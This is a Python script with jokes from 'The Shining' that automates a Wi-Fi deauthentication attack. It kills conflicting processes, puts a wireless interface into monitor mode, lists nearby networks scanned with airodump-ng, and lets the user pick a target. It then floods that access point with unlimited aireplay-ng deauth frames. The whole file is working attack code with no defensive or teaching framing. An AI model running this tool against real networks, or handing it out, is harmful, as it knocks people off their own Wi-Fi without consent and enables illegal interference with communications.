#!/usr/bin/env python3

"""
Heeere's Jhonny!!
"""

import subprocess
import csv
import os
import time
import shutil
import signal
import logging
from datetime import datetime
from typing import List, Dict, Optional, Set

# -------------------------- Configuration --------------------------
INTERFACE = "wlan1"
WRITE_PREFIX = "file"
SCAN_INTERVAL = 1  # seconds between scans
BACKUP_DIR = "backup"
FIELDNAMES = [
    'BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed',
    'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV',
    'LAN_IP', 'ID_length', 'ESSID', 'Key'
]
CLEAR_SCREEN = '\n' * 100

# -------------------------- Logging Setup --------------------------
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# -------------------------- Helper Classes --------------------------
class ProcessManager:
    """Manage subprocess lifecycle with proper cleanup."""

    def __init__(self):
        self.processes: List[subprocess.Popen] = []

    def start(self, cmd: List[str], **popen_kwargs) -> subprocess.Popen:
        proc = subprocess.Popen(cmd, **popen_kwargs)
        self.processes.append(proc)
        return proc

    def terminate_all(self):
        for proc in self.processes:
            if proc.poll() is None:  # still running
                proc.terminate()
        # Wait a bit for graceful termination
        for proc in self.processes:
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        self.processes.clear()


class NetworkScanner:
    """Scans for wireless networks using airodump-ng CSV output."""

    def __init__(self, interface: str = INTERFACE, write_prefix: str = WRITE_PREFIX):
        self.interface = interface
        self.write_prefix = write_prefix
        self.seen_bssids: Set[str] = set()
        self.networks: List[Dict[str, str]] = []
        self.last_scan_time: float = 0
        self.airodump_proc: Optional[subprocess.Popen] = None
        self.proc_manager = ProcessManager()

    # ----------------- CSV Handling -----------------
    @staticmethod
    def _ensure_backup_dir():
        if not os.path.isdir(BACKUP_DIR):
            try:
                os.mkdir(BACKUP_DIR)
                logger.debug("Created backup directory: %s", BACKUP_DIR)
            except OSError as e:
                logger.error("Failed to create backup directory: %s", e)

    def backup_csv_files(self):
        """Move existing CSV files to backup with timestamp."""
        self._ensure_backup_dir()
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        for filename in os.listdir():
            if filename.endswith(".csv"):
                src = filename
                dst = os.path.join(BACKUP_DIR, f"{timestamp}-{filename}")
                try:
                    shutil.move(src, dst)
                    logger.info("Backed up %s -> %s", src, dst)
                except Exception as e:
                    logger.error("Failed to backup %s: %s", src, e)

    @staticmethod
    def _get_latest_csv_mtime() -> float:
        latest = 0.0
        for fname in os.listdir():
            if fname.endswith(".csv"):
                try:
                    mtime = os.path.getmtime(fname)
                    if mtime > latest:
                        latest = mtime
                except OSError as e:
                    logger.warning("Could not get mtime for %s: %s", fname, e)
        return latest

    def _parse_csv_file(self, filename: str) -> List[Dict[str, str]]:
        networks = []
        try:
            with open(filename, newline='') as csvfile:
                reader = csv.DictReader(csvfile, fieldnames=FIELDNAMES)
                for row in reader:
                    bssid = row.get('BSSID', '').strip()
                    if not bssid or bssid in ('BSSID', 'Station MAC'):
                        continue
                    # Normalize ESSID (empty if hidden)
                    essid = row.get('ESSID', '').strip()
                    if essid == '':
                        essid = '<hidden>'
                    row['ESSID'] = essid
                    networks.append(row)
        except Exception as e:
            logger.error("Error parsing CSV %s: %s", filename, e)
        return networks

    def get_wireless_networks(self) -> List[Dict[str, str]]:
        """Return list of networks, updating only if CSV files changed."""
        current_mtime = self._get_latest_csv_mtime()
        if current_mtime <= self.last_scan_time:
            return self.networks  # No change

        logger.debug("CSV files updated; rescanning...")
        self.networks = []
        self.seen_bssids.clear()
        for fname in os.listdir():
            if fname.endswith(".csv"):
                for net in self._parse_csv_file(fname):
                    bssid = net['BSSID']
                    if bssid not in self.seen_bssids:
                        self.seen_bssids.add(bssid)
                        self.networks.append(net)
        self.last_scan_time = current_mtime
        return self.networks

    # ----------------- Display -----------------
    @staticmethod
    def display_networks(networks: List[Dict[str, str]]):
        print(CLEAR_SCREEN)
        print("Tony, I'm scared...")
        print("...Remember what Mr. Halloran said. It's just like pictures in a book, Danny. It isn't real.")
        print(f"{'No':<3} {'Redrum':<18} {'Room':<7} {'Guests':<32}")
        print("-" * 60)
        for idx, net in enumerate(networks):
            bssid = net['BSSID']
            channel = net.get('channel', '').strip()
            essid = net.get('ESSID', '<hidden>')
            print(f"{idx:<3} {bssid:<18} {channel:<7} {essid:<32}")

    # ----------------- User Interaction -----------------
    @staticmethod
    def get_target_choice(networks: List[Dict[str, str]]) -> int:
        while True:
            try:
                choice = input("What'll be, sir?: ").strip()
                idx = int(choice)
                if 0 <= idx < len(networks):
                    return idx
                else:
                    print("Your money is no good here sir.")
            except ValueError:
                print("Your money is no good here sir.")
            except KeyboardInterrupt:
                print("\nWhat'll be, sir?")
                continue

    # ----------------- Subprocess Helpers -----------------
    @staticmethod
    def run_cmd(cmd: List[str], timeout: int = 30) -> bool:
        try:
            result = subprocess.run(cmd, timeout=timeout,
                                    capture_output=True, text=True)
            if result.returncode != 0:
                logger.debug("Command failed: %s\nstdout: %s\nstderr: %s",
                             cmd, result.stdout, result.stderr)
            return result.returncode == 0
        except subprocess.TimeoutExpired:
            logger.error("Command timed out: %s", cmd)
            return False
        except Exception as e:
            logger.error("Unexpected error running %s: %s", cmd, e)
            return False

    # ----------------- Monitoring Lifecycle -----------------
    def start_monitoring(self):
        """Start airodump-ng in background."""
        cmd = [
            "sudo", "airodump-ng",
            "-w", self.write_prefix,
            "--write-interval", "1",
            "--output-format", "csv",
            self.interface
        ]
        logger.info("Starting airodump-ng on %s", self.interface)
        self.airodump_proc = self.proc_manager.start(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

    def stop_monitoring(self):
        """Stop airodump-ng and clean up."""
        if self.airodump_proc:
            logger.info("Stopping airodump-ng")
            self.proc_manager.terminate_all()
            self.airodump_proc = None

    # ----------------- Main Workflow -----------------
    def run(self):
        """Execute the full scanning and attack workflow."""
        # Backup existing CSVs
        self.backup_csv_files()

        # Kill interfering processes
        if not self.run_cmd(["sudo", "airmon-ng", "check", "kill"]):
            logger.warning("Failed to kill interfering processes; continuing anyway.")

        # Put interface into monitor mode
        print("REDRUM:")
        time.sleep(3)
        if not self.run_cmd(["sudo", "airmon-ng", "start", self.interface]):
            logger.error("Failed to start monitor mode on %s", self.interface)
            return

        # Start airodump-ng
        self.start_monitoring()

        # Scan for networks
        try:
            while True:
                networks = self.get_wireless_networks()
                self.display_networks(networks)
                time.sleep(SCAN_INTERVAL)
        except KeyboardInterrupt:
            logger.info("Scan interrupted by user")
            print("")
        finally:
            self.stop_monitoring()

        # Select target
        networks = self.get_wireless_networks()
        if not networks:
            logger.error("No networks found; aborting.")
            return
        choice_idx = self.get_target_choice(networks)
        target = networks[choice_idx]
        bssid = target['BSSID']
        channel = target.get('channel', '').strip()

        logger.info("Selected target: %s (channel %s)", bssid, channel)

        # Restart monitor mode on specific channel
        if not self.run_cmd(["sudo", "airmon-ng", "start", self.interface, channel]):
            logger.error("Failed to set channel %s", channel)
            return

        # Launch deauth attack
        logger.info("Starting deauth attack on %s", bssid)
        deauth_proc = self.proc_manager.start(
            ["aireplay-ng", "--deauth", "0", "-a", bssid, self.interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        try:
            while True:
                print("All work and no play, makes Jack a dull boy...")
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Deauth stopped")
            print("Whenever you come in here and interrupt me, you're breaking my concentration. You're distracting me, and it will then take me time to get back to where i was. Understand?")
            deauth_proc.terminate()
            deauth_proc.wait()


# -------------------------- Signal Handling --------------------------
def signal_handler(sig, frame):
    logger.info("Received signal %s; exiting", sig)
    print("\nGood evening Mr. Torrance. It's good to see you.")
    exit(0)


# -------------------------- Entry Point --------------------------
def main():
    signal.signal(signal.SIGTERM, signal_handler)

    if os.geteuid() != 0:
        # logger.error("Script must be run with sudo")
        print("Are you the caretaker?")
        exit(1)

    scanner = NetworkScanner()
    scanner.run()


if __name__ == "__main__":
    main()
